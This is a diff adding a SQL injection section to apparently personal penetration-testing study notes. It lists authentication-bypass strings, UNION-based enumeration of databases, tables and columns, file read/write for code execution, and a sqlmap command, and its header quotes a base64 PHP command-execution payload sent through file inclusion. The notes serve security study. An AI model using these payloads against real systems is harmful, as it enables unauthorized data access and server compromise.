@@ -150,3 +150,53 @@ http://10.11.0.22/menu.php?file=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9le
 
 
 ### 0x05. SQL injection
+
+1. authentication bypass
+
+```sql
+select * from users where name = 'tom' or 1=1;#' and password = 'jones'
+select * from users where name = 'tom' or 1=1 LIMIT 1;#
+```
+
+2. Enumerating the Database
+
+    a. column number enumeration
+
+    ```sql
+    select * from xxxx order by [num range test]
+    ```
+
+    b. Understanding the layout of the output
+
+    ```sql
+    select * from xxx union [all] select [1..column number]
+    ```
+
+    c. extracting data from the database
+
+    ```sql
+    select * from xxx union [all] select [1..column number with some information in ]
+    
+    @@version # db version
+    user()  # current user
+    table_name from information_schema.tables # enumerate database tables
+    column_name from information_schema.columns where table_name='table_name'
+    ```
+
+    d. Code Execution
+
+    - load_file:
+    - into outfile
+
+    ***tips*
+
+    > 如果文件读写受限, 需要设置 secure_file_priv=''
+
+3. Automating SQL Injection
+
+    a. sqlmap
+
+   ```bash
+   sqlmap -u url -p param
+   ```
+   
